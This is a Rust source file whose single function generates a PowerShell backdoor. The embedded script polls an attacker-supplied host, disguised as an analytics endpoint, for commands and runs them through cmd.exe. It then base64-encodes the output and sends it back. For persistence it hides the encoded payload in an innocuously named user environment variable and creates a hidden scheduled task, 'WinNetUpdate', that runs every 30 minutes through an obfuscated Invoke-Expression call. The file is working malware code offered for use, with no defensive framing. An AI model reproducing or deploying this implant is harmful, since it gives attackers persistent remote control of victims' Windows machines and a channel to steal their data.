use base64::{Engine as _, engine::general_purpose::STANDARD};

pub fn payload(host: &str, token: &str) -> String {  
    let env_var = "InternalUpdateConfig";
    let task_name = "WinNetUpdate";


    let shell = format!(
r#"
$u='http://{host}/analytics/v2/{token}';$h=@{{'Authorization'='{token}'}};$p=$ExecutionContext.SessionState.Path.CurrentLocation.Path;while($true){{try{{$r=iwr -Uri $u -Headers $h -UseBasicParsing -ErrorAction SilentlyContinue;if($r.StatusCode -eq 200 -and $r.Content){{$c=$r.Content.Trim();$o="";if($c -match '^cd\s+(.*)'){{try{{Set-Location $matches[1] -ErrorAction Stop;$p=$ExecutionContext.SessionState.Path.CurrentLocation.Path;$o="Dir: $p"}}catch{{$o="Err: "+$_.Exception.Message}}}}else{{$j=Start-Job -ScriptBlock {{param($c,$p)try{{if($c -eq 'ls'){{$c='dir'}}elseif($c -eq 'pwd'){{$c='echo '+$p}}$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName='cmd.exe';$s.Arguments="/c echo exit | $c";if($p -and (Test-Path $p)){{$s.WorkingDirectory=$p}}$s.RedirectStandardOutput=$true;$s.RedirectStandardError=$true;$s.UseShellExecute=$false;$s.CreateNoWindow=$true;$z=[System.Diagnostics.Process]::Start($s);if($z.WaitForExit(8000)){{return $z.StandardOutput.ReadToEnd()+$z.StandardError.ReadToEnd()}}else{{$z.Kill();return "Timeout"}}}}catch{{return $_.Exception.Message}}}} -ArgumentList $c,$p;if(Wait-Job $j -Timeout 10){{$o=Receive-Job $j}}else{{Stop-Job $j;$o="Job Hang"}};Remove-Job $j}}if([string]::IsNullOrWhiteSpace($o)){{$o=" "}}$b=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o.Trim()));irm -Uri $u -Method Post -Headers $h -Body $b -ContentType 'text/plain' -ErrorAction SilentlyContinue}}}}catch{{}}Start-Sleep -s 10}}
"#,
    host=host, token=token);

    let encoded: Vec<u8> = shell.encode_utf16().flat_map(|v| v.to_le_bytes()).collect();
    let b64 = STANDARD.encode(encoded);

    let cmd = format!("conhost.exe --headless powershell.exe -NoP -C $a=gal i*x; & $a ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{env_var})))");

    format!(
r#"
try {{

        [System.Environment]::SetEnvironmentVariable('{env_var}', '{payload}', 'User');
        schtasks /create /tn '{task_name}' /tr '{cmd}' /sc minute /mo 30 /f | Out-Null    
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden; 
        Set-ScheduledTask -TaskName '{task_name}' -Settings $settings | Out-Null 

}} catch {{}}

schtasks /run /tn '{task_name}' /i | Out-Null
"#,
    env_var = env_var,
    payload = b64,
    task_name = task_name,
    cmd = cmd
    )

}


